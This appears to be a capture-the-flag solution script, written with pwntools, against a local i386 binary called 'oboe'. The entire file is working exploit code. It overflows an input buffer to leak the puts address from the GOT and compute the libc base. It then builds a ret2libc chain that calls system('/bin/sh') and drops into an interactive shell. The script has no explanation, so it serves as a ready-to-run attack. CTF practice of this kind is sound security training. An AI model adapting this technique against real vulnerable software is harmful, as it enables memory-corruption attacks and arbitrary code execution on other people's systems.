from pwn import *
p = process("./oboe")
elf = ELF("./oboe")
context.arch = "i386"
libc = elf.libc

def protocol(): 
    p.sendlineafter(":\n", "A"*64) 

def domain(): 
    p.sendlineafter(":\n", "B"*64) 
    
def path(payload): 
    payload = payload + b"C"*(63 - len(payload))
    p.sendlineafter(":\n", payload) 
    

protocol() 
domain() 

payload = b"A"*10 
payload += p32(elf.sym["puts"]) 
payload += p32(elf.sym["main"]) 
payload += p32(elf.got["puts"]) 

path(payload) 

p.recvline() 
p.recvline() 
libc.address = u32(p.recv(4).strip().ljust(4,b'\x00'))  - libc.sym['puts']

log.success(f"Libc Base Address: {hex(libc.address)}") 

protocol() 
domain() 


payload = b"A"*10 
payload += p32(libc.sym["system"]) 
payload += p32(0xdeadbeef) 
payload += p32(next(libc.search(b"/bin/sh\x00"))) 

path(payload)

p.clean()
p.interactive()